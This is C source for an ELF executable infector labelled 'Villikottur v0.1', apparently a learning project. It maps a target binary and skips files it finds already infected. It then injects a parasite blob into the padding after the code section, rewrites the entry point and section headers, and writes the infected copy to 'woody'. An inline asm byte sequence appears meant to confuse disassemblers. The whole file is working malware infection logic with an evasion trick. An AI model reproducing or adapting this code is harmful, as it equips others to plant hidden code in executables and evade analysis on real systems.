#include "vil.h"

int		write_string(char *ptr, off_t size, char *filename, int fd)
{
	// ###################################################################################################################
													// INTRO + COPY CHECK
	// ###################################################################################################################
	__asm__(".byte 0x48, 0xb8, 0xff, 0xff, 0xff, 0xff, 0xeb, 0x08, 0xff, 0xff, 0x48, 0x31, 0xc0, 0xeb, 0xf7, 0xe8");
	if (visual)
		fprintf(stdout, BOLDBLUE"-x-x-x-x- "RED"\\_<O>_<O>_/ "BLUE"-x-x-x-x-\n"RED"-> "CYAN"%s\n\n"RESET, filename);
	message = "Villikottur v0.1 <pharatyk>";
	if (check_copy(ptr, size))
	{
		if (visual)
		{
			fprintf(stderr, BOLDRED"<"CYAN"o"RED">"RESET CYAN"%s"YELLOW" already infected\n", filename);
			fprintf(stdout, BOLDBLUE"-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-\n\n"RESET);
		}
		return (0);
	}
	// ###################################################################################################################
															// INIT
	// ###################################################################################################################
	int ret = is_32or64ELF(ptr);
	if (ret != 2)
	{
		if (visual)
			fprintf(stderr, BOLDRED"fuck the bonus, its not supported\n"RESET);
		return (0);
	}

	encr_bundle_size = strlen(message);
	Elf64_Ehdr *ehdr = (Elf64_Ehdr *) ptr;
	// Identify the binary & SKIP Relocatable, files and 32-bit class of binaries
    if (ehdr->e_type == ET_REL || ehdr->e_type == ET_CORE)
    	return (0);
	ParasiteLoader("./vil_obj/PARASITE/parasite.bin");

	off_t	padding_size;
	padding_size = PaddingSizeFinder_64_v2(ptr);
	if (padding_size < parasite_full_size)
	{
		if (visual)
			fprintf(stderr, BOLDRED"<o>"RESET YELLOW" Host "CYAN"%s"YELLOW" parasite too big, not supported YET :(\n"RESET, filename);
		return (0);
	}

	off_t	original_entry_point = ehdr->e_entry;
	ehdr->e_entry 	+= (parasite_offset - original_entry_point + encr_bundle_size);
	// Patch SHT
	SHT_Patcher_64(ptr);

	// ###################################################################################################################
										// PARASITE PATCHING + HOST INFESTATION
	// ###################################################################################################################

	// Patch Parasite with entrypoint and .text start
	AddrPatcher(parasite_code, 0xAAAAAAAAAAAAAAAA, parasite_offset - original_entry_point);

	if (visual)
		fprintf(stdout, BOLDRED"<"CYAN"o"RED">"RESET YELLOW" stuff in ["RED"%x"YELLOW"]\n"RESET, parasite_offset);

	int fd2;
	if ((fd2 = open("woody", O_WRONLY | O_CREAT | O_TRUNC, 0644)) == -1)
		return (1);

	write(fd2, ptr, (parasite_offset));
	write(fd2, message, encr_bundle_size);
	write(fd2, parasite_code, parasite_size);
	for (off_t i = 0; i < (padding_size - parasite_full_size); ++i)
		write(fd2, "\0", 1);
	write(fd2, ptr + textafter, (size - textafter));
	close(fd2);

	if (visual)
	{
		fprintf(stdout, BOLDRED"<"CYAN"o"RED">"RESET YELLOW" success \\o/  :  "CYAN"%s\n"RESET, filename);
		fprintf(stdout, BOLDBLUE"-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-\n\n"RESET);
	}

	return (0);
}

int			file_checker(char *filename)
{
	int			fd;
	char		*ptr;
	struct stat	buf;

	if ((fd = open(filename, O_RDWR)) < 0)
		return (error("open failed\n"));
	if (fstat(fd, &buf) < 0)
		return (error("fstat failed\n"));
	if (S_ISDIR(buf.st_mode))
	{
		fprintf(stderr, "%s is a directory\n", filename);
		return (1);
	}
	if ((ptr = mmap(0, buf.st_size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE, fd, 0))
		== MAP_FAILED)
		return (error("mmap failed\n"));
	if (write_string(ptr, buf.st_size, filename, fd))
		return (1);
	if (munmap(ptr, buf.st_size) < 0)
		return (error("munmap failed\n"));
	if (close(fd) < 0)
		return (error("failes to close fd\n"));
	return (0);
}
